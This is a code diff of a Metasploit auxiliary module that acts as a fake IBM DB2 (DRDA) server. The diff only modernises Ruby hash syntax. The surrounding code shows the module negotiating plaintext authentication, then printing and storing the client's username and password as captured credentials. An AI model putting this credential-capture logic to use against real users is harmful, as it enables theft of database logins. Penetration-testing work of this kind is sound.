@@ -62,12 +62,12 @@ class Metasploit3 < Msf::Auxiliary
 
   def on_client_connect(c)
     @state[c] = {
-      :name     => "#{c.peerhost}:#{c.peerport}",
-      :ip       => c.peerhost,
-      :port     => c.peerport,
-      :user     => nil,
-      :pass     => nil,
-      :database => nil
+      name: "#{c.peerhost}:#{c.peerport}",
+      ip: c.peerhost,
+      port: c.peerport,
+      user: nil,
+      pass: nil,
+      database: nil
     }
   end
 
@@ -104,9 +104,9 @@ class Metasploit3 < Msf::Auxiliary
   # parses and returns a DRDA parameter
   def drda_parse_parameter(data)
     param = {
-      :length => data.slice!(0,2).unpack("n")[0],
-      :codepoint => data.slice!(0,2).unpack("n")[0],
-      :data => ""
+      length: data.slice!(0,2).unpack("n")[0],
+      codepoint: data.slice!(0,2).unpack("n")[0],
+      data: ""
     }
     param[:data] = drda_ebdic_to_ascii(data.slice!(0,param[:length] - 4).unpack("A*")[0])
     param
@@ -115,15 +115,15 @@ class Metasploit3 < Msf::Auxiliary
   # creates a DRDA parameter
   def drda_create_parameter(codepoint, data)
     param = {
-      :codepoint => codepoint,
-      :data => drda_ascii_to_ebdic(data),
-      :length => data.length + 4
+      codepoint: codepoint,
+      data: drda_ascii_to_ebdic(data),
+      length: data.length + 4
     }
     param
   end
 
   # creates a DRDA CMD with parameters and returns it as an opaque string
-  def drda_create_cmd(codepoint, options = { :format => 0x43, :correlid => 0x01 }, params=[])
+  def drda_create_cmd(codepoint, options = { format: 0x43, correlid: 0x01 }, params=[])
     data = ""
     for p in params.each
       data << [p[:length]].pack("n")
@@ -149,13 +149,13 @@ class Metasploit3 < Msf::Auxiliary
 
     until data.empty?
       cp = {
-        :length => data.slice!(0, 2).unpack("n")[0],
-        :magic  => data.slice!(0, 1).unpack("C")[0],
-        :format => data.slice!(0, 1).unpack("C")[0],
-        :corellid => data.slice!(0,2).unpack("n")[0],
-        :length2 => data.slice!(0,2).unpack("n")[0],
-        :codepoint => data.slice!(0,2).unpack("n")[0],
-        :params => []
+        length: data.slice!(0, 2).unpack("n")[0],
+        magic: data.slice!(0, 1).unpack("C")[0],
+        format: data.slice!(0, 1).unpack("C")[0],
+        corellid: data.slice!(0,2).unpack("n")[0],
+        length2: data.slice!(0,2).unpack("n")[0],
+        codepoint: data.slice!(0,2).unpack("n")[0],
+        params: []
       }
       cpdata = data.slice!(0, cp[:length] - 10)
       until cpdata.empty?
@@ -189,11 +189,11 @@ class Metasploit3 < Msf::Auxiliary
         params << drda_create_parameter(Constants::CODEPOINT_SRVRLSLV, "SQL10010")
 
         cmd = []
-        cmd << drda_create_cmd(Constants::CODEPOINT_EXCSATRD, { :format => 0x43, :correlid => 1 }, params)
+        cmd << drda_create_cmd(Constants::CODEPOINT_EXCSATRD, { format: 0x43, correlid: 1 }, params)
 
         params = []
         params << drda_create_parameter(Constants::CODEPOINT_SECMEC, "\x00\x03")
-        cmd << drda_create_cmd(Constants::CODEPOINT_ACCSECRD, { :format => 3, :correlid => 2 }, params)
+        cmd << drda_create_cmd(Constants::CODEPOINT_ACCSECRD, { format: 3, correlid: 2 }, params)
 
         drda_send_cmd(c, cmd)
 
@@ -217,13 +217,13 @@ class Metasploit3 < Msf::Auxiliary
     if @state[c][:user] and @state[c][:pass]
       print_status("DRDA LOGIN #{@state[c][:name]} Database: #{@state[c][:database]}; #{@state[c][:user]} / #{@state[c][:pass]}")
       report_auth_info(
-        :host      => @state[c][:ip],
-        :port      => datastore['SRVPORT'],
-        :sname     => 'db2_client',
-        :user      => @state[c][:user],
-        :pass      => @state[c][:pass],
-        :source_type => "captured",
-        :active    => true
+        host: @state[c][:ip],
+        port: datastore['SRVPORT'],
+        sname: 'db2_client',
+        user: @state[c][:user],
+        pass: @state[c][:pass],
+        source_type: "captured",
+        active: true
       )
 
       params = []
@@ -231,7 +231,7 @@ class Metasploit3 < Msf::Auxiliary
       params << drda_create_parameter(Constants::CODEPOINT_SECCHKCD, "\x0f")
 
       cmd = []
-      cmd << drda_create_cmd(Constants::CODEPOINT_SECCHKRM, { :format => 2, :correlid => 1 }, params)
+      cmd << drda_create_cmd(Constants::CODEPOINT_SECCHKRM, { format: 2, correlid: 1 }, params)
 
       drda_send_cmd(c, cmd)
       #c.close
